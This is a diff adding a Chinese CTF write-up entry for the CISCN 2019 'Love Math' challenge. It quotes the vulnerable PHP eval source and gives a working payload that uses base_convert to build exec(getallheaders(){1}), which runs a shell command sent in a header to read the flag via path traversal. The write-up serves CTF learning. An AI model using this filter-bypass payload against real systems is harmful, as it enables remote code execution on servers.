@@ -296,3 +296,50 @@ for x in range(1000):
         print(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs)))
         break
 ```
+### 16.[CISCN 2019 初赛]Love Math
+题目直接给源码：
+```php
+<?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+}
+```
+过滤了一些字符串，并且只可以使用规定的`函数字母`，长度不可以超过`80`
+`base_convert`这个函数是重点，因为`36进制`包含所有字母，以及`30进制`
+用法：base_convert(‘被转的字符串’，‘字符串的进制’，‘希望转的进制数’);
+    
+    将exec转成10进制base_convert("exec", 36, 10)得到696468
+    将getallheaders转成10进制base_convert("getallheaders", 30, 10)得到8768397090111664438
+    这里的getallheaders如果使用36进制太长，回造成溢出，导致10进制转成36进制时候出错
+    再利用php的动态函数特性:
+        $function = "print_r";
+        $function(); //等同于print_r()
+payload:`$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})``这个pi也是白名单函数中的字母。`
+//exec(getallheaders(){1})
+通过headers传递1:cat ../../../../flag得到flag
+### 17.[CISCN2019 总决赛 Day2 Web1]Easyweb
+sql注入
